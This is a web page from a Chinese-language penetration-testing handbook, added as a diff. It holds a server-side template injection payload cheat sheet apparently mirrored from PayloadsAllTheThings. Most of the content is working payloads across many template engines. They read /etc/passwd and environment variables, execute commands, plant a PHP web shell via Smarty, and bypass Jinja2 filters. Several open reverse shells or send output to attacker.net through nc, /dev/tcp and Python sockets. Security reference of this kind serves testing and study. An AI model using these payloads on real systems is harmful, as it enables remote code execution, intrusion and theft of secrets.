@@ -1,0 +1,1055 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>模板注入-SSTI · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    
+    <link rel="prev" href="../[XML实体注入漏洞-XXE" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    简介
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../SUMMARY.html">
+            
+                <a href="../SUMMARY.html">
+            
+                    
+                    目录
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="2.1" >
+            
+                <span>
+            
+                    
+                    注入漏洞
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.1" data-path="../命令注入/">
+            
+                <a href="../命令注入/">
+            
+                    
+                    命令注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.2" data-path="../SQL注入/">
+            
+                <a href="../SQL注入/">
+            
+                    
+                    SQL注入
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.2.1" data-path="../SQL注入/MYSQL.md">
+            
+                <span>
+            
+                    
+                    MYSQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.2.2" data-path="../SQL注入/MSSQL.html">
+            
+                <a href="../SQL注入/MSSQL.html">
+            
+                    
+                    MSSQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.2.3" data-path="../SQL注入/PostgreSQL.html">
+            
+                <a href="../SQL注入/PostgreSQL.html">
+            
+                    
+                    PostgreSQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.2.4" data-path="../SQL注入/SQLite.html">
+            
+                <a href="../SQL注入/SQLite.html">
+            
+                    
+                    SQLite
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3" data-path="../CRLF注入/">
+            
+                <a href="../CRLF注入/">
+            
+                    
+                    CRLF注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.4" data-path="../LDAP注入/">
+            
+                <a href="../LDAP注入/">
+            
+                    
+                    LDAP注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.5" data-path="../NOSQL注入/">
+            
+                <a href="../NOSQL注入/">
+            
+                    
+                    NOSQL注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.6" data-path="../XPATH注入/">
+            
+                <a href="../XPATH注入/">
+            
+                    
+                    XPATH注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.7" data-path="../SAML注入/">
+            
+                <a href="../SAML注入/">
+            
+                    
+                    SAML注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.8" data-path="../[XML实体注入漏洞-XXE">
+            
+                <span>
+            
+                    
+                    XML实体注入漏洞-XXE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="2.1.9" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    模板注入-SSTI
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2" >
+            
+                <span>
+            
+                    
+                    前端安全
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.2.1" data-path="../跨站脚本攻击-XSS/">
+            
+                <a href="../跨站脚本攻击-XSS/">
+            
+                    
+                    跨站脚本攻击-XSS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.2" data-path="../跨站请求伪造-CSRF/">
+            
+                <a href="../跨站请求伪造-CSRF/">
+            
+                    
+                    跨站请求伪造-CSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.3" data-path="../CORS配置错误/">
+            
+                <a href="../CORS配置错误/">
+            
+                    
+                    CORS配置错误
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.4" data-path="../Web缓存泄露/">
+            
+                <a href="../Web缓存泄露/">
+            
+                    
+                    Web缓存泄露
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3" >
+            
+                <span>
+            
+                    
+                    权限控制
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.3.1" data-path="../不安全的代码管理/">
+            
+                <a href="../不安全的代码管理/">
+            
+                    
+                    不安全的代码管理
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3.2" data-path="../不安全的对象引用/">
+            
+                <a href="../不安全的对象引用/">
+            
+                    
+                    不安全的对象引用
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3.3" data-path="../不安全的管理接口/">
+            
+                <a href="../不安全的管理接口/">
+            
+                    
+                    不安全的管理接口
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4" >
+            
+                <span>
+            
+                    
+                    文件相关漏洞
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.4.1" data-path="../文件上传漏洞/">
+            
+                <a href="../文件上传漏洞/">
+            
+                    
+                    文件上传漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.2" data-path="../文件包含/README.md">
+            
+                <span>
+            
+                    
+                    文件包含
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="3.1" >
+            
+                <span>
+            
+                    
+                    认证方式漏洞
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.1.1" data-path="../JWT安全问题/">
+            
+                <a href="../JWT安全问题/">
+            
+                    
+                    JWT安全问题
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.1.2" data-path="../OAuth认证/">
+            
+                <a href="../OAuth认证/">
+            
+                    
+                    OAuth认证
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2" >
+            
+                <span>
+            
+                    
+                    其他漏洞
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.2.1" data-path="../任意url跳转/">
+            
+                <a href="../任意url跳转/">
+            
+                    
+                    任意url跳转
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2.2" data-path="../目录遍历/">
+            
+                <a href="../目录遍历/">
+            
+                    
+                    目录遍历
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2.3" data-path="../服务端请求伪造-SSRF/">
+            
+                <a href="../服务端请求伪造-SSRF/">
+            
+                    
+                    服务端请求伪造-SSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="4.1" >
+            
+                <span>
+            
+                    
+                    代码审计
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="4.1.1" data-path="../PHP弱类型/">
+            
+                <a href="../PHP弱类型/">
+            
+                    
+                    PHP弱类型
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="4.2" >
+            
+                <span>
+            
+                    
+                    内网渗透
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="4.2.1" data-path="../内网技巧/内网技巧.html">
+            
+                <a href="../内网技巧/内网技巧.html">
+            
+                    
+                    内网技巧
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >模板注入-SSTI</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="templates-injections">Templates Injections</h1>
+<blockquote>
+<p>Template injection allows an attacker to include template code into an existant (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages</p>
+</blockquote>
+<h2 id="summary">Summary</h2>
+<ul>
+<li><a href="#tools">Tools</a></li>
+<li><a href="#methodology">Methodology</a></li>
+<li><a href="#ruby">Ruby</a><ul>
+<li><a href="#basic-injection">Basic injection</a></li>
+<li><a href="#retrieve--etc-passwd">Retrieve /etc/passwd</a></li>
+<li><a href="#list-files-and-directories">List files and directories</a></li>
+</ul>
+</li>
+<li><a href="#java">Java</a><ul>
+<li><a href="#basic-injection">Basic injection</a></li>
+<li><a href="retrieve-the-system-s-environment-variables">Retrieve the system&#x2019;s environment variables</a></li>
+<li><a href="#retrieve--etc-passwd">Retrieve /etc/passwd</a></li>
+</ul>
+</li>
+<li><a href="#twig">Twig</a><ul>
+<li><a href="#basic-injection">Basic injection</a></li>
+<li><a href="#template-format">Template format</a></li>
+<li><a href="#code-execution">Code execution</a></li>
+</ul>
+</li>
+<li><a href="#smarty">Smarty</a></li>
+<li><a href="#freemarker">Freemarker</a><ul>
+<li><a href="#basic-injection">Basic injection</a></li>
+<li><a href="#code-execution">Code execution</a></li>
+</ul>
+</li>
+<li><a href="#jade---codepen">Jade / Codepen</a></li>
+<li><a href="#velocity">Velocity</a></li>
+<li><a href="#mako">Mako</a></li>
+<li><a href="#jinja2">Jinja2</a><ul>
+<li><a href="#basic-injection">Basic injection</a></li>
+<li><a href="#template-format">Template format</a></li>
+<li><a href="#dump-all-used-classes">Dump all used classes</a></li>
+<li><a href="#dump-all-config-variables">Dump all config variables</a></li>
+<li><a href="#read-remote-file">Read remote file</a></li>
+<li><a href="#write-into-remote-file">Write into remote file</a></li>
+<li><a href="#remote-code-execution">Remote Code Execution</a></li>
+<li><a href="filter-bypass">Filter bypass</a></li>
+</ul>
+</li>
+<li><a href="#jinjava">Jinjava</a><ul>
+<li><a href="#basic-injection">Basic injection</a></li>
+<li><a href="#command-execution">Command execution</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="tools">Tools</h2>
+<p>Recommended tool: <a href="https://github.com/epinna/tplmap" target="_blank">Tplmap</a>
+e.g:</p>
+<pre><code class="lang-powershell">python2.<span class="hljs-number">7</span> ./tplmap.py -u <span class="hljs-string">&apos;http://www.target.com/page?name=John*&apos;</span> --os-shell
+python2.<span class="hljs-number">7</span> ./tplmap.py -u <span class="hljs-string">&quot;http://192.168.56.101:3000/ti?user=*&amp;comment=supercomment&amp;link&quot;</span>
+python2.<span class="hljs-number">7</span> ./tplmap.py -u <span class="hljs-string">&quot;http://192.168.56.101:3000/ti?user=InjectHere*&amp;comment=A&amp;link&quot;</span> --level <span class="hljs-number">5</span> -e jade
+</code></pre>
+<h2 id="methodology">Methodology</h2>
+<p><img src="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Images/serverside.png?raw=true" alt="SSTI cheatsheet workflow"></p>
+<h2 id="ruby">Ruby</h2>
+<h3 id="basic-injection">Basic injection</h3>
+<pre><code class="lang-ruby">&lt;%= <span class="hljs-number">7</span> * <span class="hljs-number">7</span> %&gt;
+</code></pre>
+<h3 id="retrieve-etcpasswd">Retrieve /etc/passwd</h3>
+<pre><code class="lang-ruby">&lt;%= File.open(<span class="hljs-string">&apos;/etc/passwd&apos;</span>).read %&gt;
+</code></pre>
+<h3 id="list-files-and-directories">List files and directories</h3>
+<pre><code class="lang-ruby">&lt;%= Dir.entries(<span class="hljs-string">&apos;/&apos;</span>) %&gt;
+</code></pre>
+<h2 id="java">Java</h2>
+<h3 id="basic-injection">Basic injection</h3>
+<pre><code class="lang-java">${7*7}
+${{7*7}}
+${class.getClassLoader()}
+${class.getResource(&quot;&quot;).getPath()}
+${class.getResource(&quot;../../../../../index.htm&quot;).getContent()}
+</code></pre>
+<h3 id="retrieve-the-systems-environment-variables">Retrieve the system&#x2019;s environment variables</h3>
+<pre><code class="lang-java">${T(java.lang.System).getenv()}
+</code></pre>
+<h3 id="retrieve-etcpasswd">Retrieve /etc/passwd</h3>
+<pre><code class="lang-java">${T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&apos;cat etc/passwd&apos;</span>)}
+
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(<span class="hljs-number">99</span>).concat(T(java.lang.Character).toString(<span class="hljs-number">97</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">116</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">32</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">47</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">101</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">116</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">99</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">47</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">112</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">97</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">115</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">115</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">119</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">100</span>))).getInputStream())}
+</code></pre>
+<h2 id="twig">Twig</h2>
+<h3 id="basic-injection">Basic injection</h3>
+<pre><code class="lang-python">{{<span class="hljs-number">7</span>*<span class="hljs-number">7</span>}}
+{{<span class="hljs-number">7</span>*<span class="hljs-string">&apos;7&apos;</span>}} would result <span class="hljs-keyword">in</span> <span class="hljs-number">49</span>
+</code></pre>
+<h3 id="template-format">Template format</h3>
+<pre><code class="lang-python">$output = $twig &gt; render (
+  <span class="hljs-string">&apos;Dear&apos;</span> . $_GET[<span class="hljs-string">&apos;custom_greeting&apos;</span>],
+  array(<span class="hljs-string">&quot;first_name&quot;</span> =&gt; $user.first_name)
+);
+
+$output = $twig &gt; render (
+  <span class="hljs-string">&quot;Dear {first_name}&quot;</span>,
+  array(<span class="hljs-string">&quot;first_name&quot;</span> =&gt; $user.first_name)
+);
+</code></pre>
+<h3 id="code-execution">Code execution</h3>
+<pre><code class="lang-python">{{self}}
+{{_self.env.setCache(<span class="hljs-string">&quot;ftp://attacker.net:2121&quot;</span>)}}{{_self.env.loadTemplate(<span class="hljs-string">&quot;backdoor&quot;</span>)}}
+{{_self.env.registerUndefinedFilterCallback(<span class="hljs-string">&quot;exec&quot;</span>)}}{{_self.env.getFilter(<span class="hljs-string">&quot;id&quot;</span>)}}
+</code></pre>
+<h2 id="smarty">Smarty</h2>
+<pre><code class="lang-python">{php}echo `id`;{/php}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,<span class="hljs-string">&quot;&lt;?php passthru($_GET[&apos;cmd&apos;]); ?&gt;&quot;</span>,self::clearConfig())}
+</code></pre>
+<h2 id="freemarker">Freemarker</h2>
+<p>You can try your payloads at <a href="https://try.freemarker.apache.org" target="_blank">https://try.freemarker.apache.org</a></p>
+<h3 id="basic-injection">Basic injection</h3>
+<p>The template can be <code>${3*3}</code> or the legacy <code>#{3*3}</code></p>
+<h3 id="code-execution">Code execution</h3>
+<pre><code class="lang-js">&lt;#assign ex = &quot;freemarker.template.utility.Execute&quot;?new()&gt;${ ex(&quot;id&quot;)}
+[#assign ex = &apos;freemarker.template.utility.Execute&apos;?new()]${ ex(&apos;id&apos;)}
+${&quot;freemarker.template.utility.Execute&quot;?new()(&quot;id&quot;)}
+</code></pre>
+<h2 id="jade--codepen">Jade / Codepen</h2>
+<pre><code class="lang-python">- var x = root.process
+- x = x.mainModule.require
+- x = x(<span class="hljs-string">&apos;child_process&apos;</span>)
+= x.exec(<span class="hljs-string">&apos;id | nc attacker.net 80&apos;</span>)
+</code></pre>
+<h2 id="velocity">Velocity</h2>
+<pre><code class="lang-python"><span class="hljs-comment">#set($str=$class.inspect(&quot;java.lang.String&quot;).type)</span>
+<span class="hljs-comment">#set($chr=$class.inspect(&quot;java.lang.Character&quot;).type)</span>
+<span class="hljs-comment">#set($ex=$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;whoami&quot;))</span>
+$ex.waitFor()
+<span class="hljs-comment">#set($out=$ex.getInputStream())</span>
+<span class="hljs-comment">#foreach($i in [1..$out.available()])</span>
+$str.valueOf($chr.toChars($out.read()))
+<span class="hljs-comment">#end</span>
+</code></pre>
+<h2 id="mako">Mako</h2>
+<pre><code class="lang-python">&lt;%
+<span class="hljs-keyword">import</span> os
+x=os.popen(<span class="hljs-string">&apos;id&apos;</span>).read()
+%&gt;
+${x}
+</code></pre>
+<h2 id="jinja2">Jinja2</h2>
+<p><a href="http://jinja.pocoo.org/" target="_blank">Official website</a></p>
+<blockquote>
+<p>Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.  </p>
+</blockquote>
+<h3 id="basic-injection">Basic injection</h3>
+<pre><code class="lang-python">{{<span class="hljs-number">4</span>*<span class="hljs-number">4</span>}}[[<span class="hljs-number">5</span>*<span class="hljs-number">5</span>]]
+{{<span class="hljs-number">7</span>*<span class="hljs-string">&apos;7&apos;</span>}} would result <span class="hljs-keyword">in</span> <span class="hljs-number">7777777</span>
+{{config.items()}}
+</code></pre>
+<p>Jinja2 is used by Python Web Frameworks such as Django or Flask.
+The above injections have been tested on Flask application.</p>
+<h3 id="template-format">Template format</h3>
+<pre><code class="lang-python">{% extends &quot;layout.html&quot; %}
+{% block body %}
+  &lt;ul&gt;
+  {% for user in users %}
+    &lt;li&gt;&lt;a href=&quot;{{ user.url }}&quot;&gt;{{ user.username }}&lt;/a&gt;&lt;/li&gt;
+  {% endfor %}
+  &lt;/ul&gt;
+{% endblock %}
+</code></pre>
+<h3 id="dump-all-used-classes">Dump all used classes</h3>
+<pre><code class="lang-python">{{ [].<span class="hljs-keyword">class</span>.base.subclasses() }}
+{{<span class="hljs-string">&apos;&apos;</span>.<span class="hljs-keyword">class</span>.mro()[<span class="hljs-number">1</span>].subclasses()}}
+{{ <span class="hljs-string">&apos;&apos;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__() }}
+</code></pre>
+<h3 id="dump-all-config-variables">Dump all config variables</h3>
+<pre><code class="lang-python">{% for key, value in config.iteritems() %}
+    &lt;dt&gt;{{ key|e }}&lt;/dt&gt;
+    &lt;dd&gt;{{ value|e }}&lt;/dd&gt;
+{% endfor %}
+</code></pre>
+<h3 id="read-remote-file">Read remote file</h3>
+<pre><code class="lang-python"><span class="hljs-comment"># &apos;&apos;.__class__.__mro__[2].__subclasses__()[40] = File class</span>
+{{ <span class="hljs-string">&apos;&apos;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&apos;/etc/passwd&apos;</span>).read() }}
+{{ config.items()[<span class="hljs-number">4</span>][<span class="hljs-number">1</span>].__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&quot;/tmp/flag&quot;</span>).read() }}
+</code></pre>
+<h3 id="write-into-remote-file">Write into remote file</h3>
+<pre><code class="lang-python">{{ <span class="hljs-string">&apos;&apos;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&apos;/var/www/html/myflaskapp/hello.txt&apos;</span>, <span class="hljs-string">&apos;w&apos;</span>).write(<span class="hljs-string">&apos;Hello here !&apos;</span>) }}
+</code></pre>
+<h3 id="remote-code-execution">Remote Code Execution</h3>
+<p>Listen for connexion</p>
+<pre><code class="lang-bash">nv -lnvp 8000
+</code></pre>
+<h4 id="exploit-the-ssti-by-calling-subprocesspopen">Exploit the SSTI by calling subprocess.Popen.</h4>
+<p>:warning: the number 396 will vary depending of the application.</p>
+<pre><code class="lang-python">{{<span class="hljs-string">&apos;&apos;</span>.__class__.mro()[<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">396</span>](<span class="hljs-string">&apos;cat flag.txt&apos;</span>,shell=<span class="hljs-keyword">True</span>,stdout=<span class="hljs-number">-1</span>).communicate()[<span class="hljs-number">0</span>].strip()}}
+</code></pre>
+<h4 id="exploit-the-ssti-by-calling-popen-without-guessing-the-offset">Exploit the SSTI by calling Popen without guessing the offset</h4>
+<pre><code class="lang-python">{% <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ().__class__.__base__.__subclasses__() %}{% <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;warning&quot;</span> <span class="hljs-keyword">in</span> x.__name__ %}{{x()._module.__builtins__[<span class="hljs-string">&apos;__import__&apos;</span>](<span class="hljs-string">&apos;os&apos;</span>).popen(<span class="hljs-string">&quot;python3 -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;ip\&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/cat\&quot;, \&quot;flag.txt\&quot;]);&apos;&quot;</span>).read().zfill(<span class="hljs-number">417</span>)}}{%endif%}{% endfor %}
+</code></pre>
+<h4 id="exploit-the-ssti-by-writing-an-evil-config-file">Exploit the SSTI by writing an evil config file.</h4>
+<pre><code class="lang-python"><span class="hljs-comment"># evil config</span>
+{{ <span class="hljs-string">&apos;&apos;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&apos;/tmp/evilconfig.cfg&apos;</span>, <span class="hljs-string">&apos;w&apos;</span>).write(<span class="hljs-string">&apos;from subprocess import check_output\n\nRUNCMD = check_output\n&apos;</span>) }} 
+
+<span class="hljs-comment"># load the evil config</span>
+{{ config.from_pyfile(<span class="hljs-string">&apos;/tmp/evilconfig.cfg&apos;</span>) }}  
+
+<span class="hljs-comment"># connect to evil host</span>
+{{ config[<span class="hljs-string">&apos;RUNCMD&apos;</span>](<span class="hljs-string">&apos;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/x.x.x.x/8000 0&gt;&amp;1&quot;&apos;</span>,shell=<span class="hljs-keyword">True</span>) }}
+</code></pre>
+<h3 id="filter-bypass">Filter bypass</h3>
+<pre><code class="lang-python">request.__class__
+request[<span class="hljs-string">&quot;__class__&quot;</span>]
+</code></pre>
+<p>Bypassing <code>_</code></p>
+<pre><code class="lang-python">http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&amp;class=class&amp;usc=_
+
+{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
+{{request|attr([&quot;_&quot;*2,&quot;class&quot;,&quot;_&quot;*2]|join)}}
+{{request|attr([&quot;__&quot;,&quot;class&quot;,&quot;__&quot;]|join)}}
+{{request|attr(&quot;__class__&quot;)}}
+{{request.__class__}}
+</code></pre>
+<p>Bypassing <code>[</code> and <code>]</code></p>
+<pre><code class="lang-python">http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&amp;class=class&amp;usc=_
+or
+http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&amp;l=a&amp;a=_&amp;a=_&amp;a=class&amp;a=_&amp;a=_
+</code></pre>
+<p>Bypassing <code>|join</code></p>
+<pre><code class="lang-python">http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&amp;f=%s%sclass%s%s&amp;a=_
+</code></pre>
+<h2 id="jinjava">Jinjava</h2>
+<h3 id="basic-injection">Basic injection</h3>
+<pre><code class="lang-python">{{<span class="hljs-string">&apos;a&apos;</span>.toUpperCase()}} would result <span class="hljs-keyword">in</span> <span class="hljs-string">&apos;A&apos;</span>
+{{ request }} would <span class="hljs-keyword">return</span> a request object like com.[...].context.TemplateContextRequest@<span class="hljs-number">23548206</span>
+</code></pre>
+<p>Jinjava is an open source project developped by Hubspot, available at <a href="https://github.com/HubSpot/jinjava/" target="_blank">https://github.com/HubSpot/jinjava/</a></p>
+<h3 id="command-execution">Command execution</h3>
+<p>Fixed by <a href="https://github.com/HubSpot/jinjava/pull/230" target="_blank">https://github.com/HubSpot/jinjava/pull/230</a></p>
+<pre><code class="lang-python">{{&apos;a&apos;.getClass().forName(&apos;javax.script.ScriptEngineManager&apos;).newInstance().getEngineByName(&apos;JavaScript&apos;).eval(\&quot;new java.lang.String(&apos;xxx&apos;)\&quot;)}}
+
+{{&apos;a&apos;.getClass().forName(&apos;javax.script.ScriptEngineManager&apos;).newInstance().getEngineByName(&apos;JavaScript&apos;).eval(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;whoami\\\&quot;); x.start()\&quot;)}}
+
+{{&apos;a&apos;.getClass().forName(&apos;javax.script.ScriptEngineManager&apos;).newInstance().getEngineByName(&apos;JavaScript&apos;).eval(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;netstat\\\&quot;); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\&quot;)}}
+
+
+{{&apos;a&apos;.getClass().forName(&apos;javax.script.ScriptEngineManager&apos;).newInstance().getEngineByName(&apos;JavaScript&apos;).eval(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;uname\\\&quot;,\\\&quot;-a\\\&quot;); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\&quot;)}}
+</code></pre>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/" target="_blank">https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/</a></li>
+<li><a href="https://hawkinsecurity.com/2017/12/13/rce-via-spring-engine-ssti/" target="_blank">Yahoo! RCE via Spring Engine SSTI</a></li>
+<li><a href="https://www.trustedsec.com/2017/09/rubyerb-template-injection/" target="_blank">Ruby ERB Template injection - TrustedSec</a></li>
+<li><a href="https://gist.github.com/Yas3r/7006ec36ffb987cbfb98" target="_blank">Gist - Server-Side Template Injection - RCE For the Modern WebApp by James Kettle (PortSwigger)</a></li>
+<li><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf" target="_blank">PDF - Server-Side Template Injection: RCE for the modern webapp - @albinowax</a></li>
+<li><a href="https://magicbluech.github.io/2017/12/02/VelocityServlet-Expression-language-Injection/" target="_blank">VelocityServlet Expression Language injection</a></li>
+<li><a href="https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti" target="_blank">Cheatsheet - Flask &amp; Jinja2 SSTI - Sep 3, 2018 &#x2022; By phosphore</a></li>
+<li><a href="https://medium.com/@ajdumanhug/ritsec-ctf-2018-writeup-web-72a0e5aa01ad" target="_blank">RITSEC CTF 2018 WriteUp (Web) - Aj Dumanhug</a></li>
+<li><a href="https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html?spref=tw" target="_blank">RCE in Hubspot with EL injection in HubL - @fyoorer</a></li>
+<li><a href="https://0day.work/jinja2-template-injection-filter-bypasses/" target="_blank">Jinja2 template injection filter bypasses - @gehaxelt, @0daywork</a></li>
